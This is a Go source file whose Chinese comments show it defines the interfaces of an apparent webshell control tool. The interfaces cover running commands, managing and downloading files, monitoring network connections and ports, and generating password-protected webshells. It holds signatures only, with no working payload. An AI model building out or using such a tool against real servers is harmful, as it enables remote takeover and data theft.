package server

import "caffeine/core"

// 发送到Webshell的数据生成器（不负责加密）
type WebShellServer interface {
	CheckOnline() []byte             //检查是否在线 ,输出hello
	GetOsInfo() []byte               //获取系统信息,输出json数据，对应core.SystemInfo
	RunCmd(path, args string) []byte //运行cmd,path:cmd路径 args:运行的命令
	FileManager
}

// 文件管理功能
type FileManager interface {
	LoadDir(path string) []byte          //加载目录,输出json数据，对应core.Directory
	Download(filepath string) []byte     //下载文件
	ReadFile(info *core.FileInfo) []byte //读取文件，只支持小文件读取(<100M),请调用前检查
	MakeDir(path string) []byte          //创建目录,path:新建目录绝对路径
	MakeFile(filepath string) []byte     //创建文件,filepath:新建文件的绝对路径
	WriteFile(file *core.FileInfo, data string) []byte
	Delete(filepath string) []byte //删除文件或者目录
}

type Monitor interface {
	GetNetworkInterfaces() []byte //获取网卡信息
	GetListeningPorts() []byte    //获取监听的端口
	GetActiveConnections() []byte //获取活跃的网络连接
	GetSystemMetrics() []byte     //获取cpu和内存的使用情况
}

// Webshell 生成器
type WebShellGenerator interface {
	Generate(pass string) string //生成webshell
}
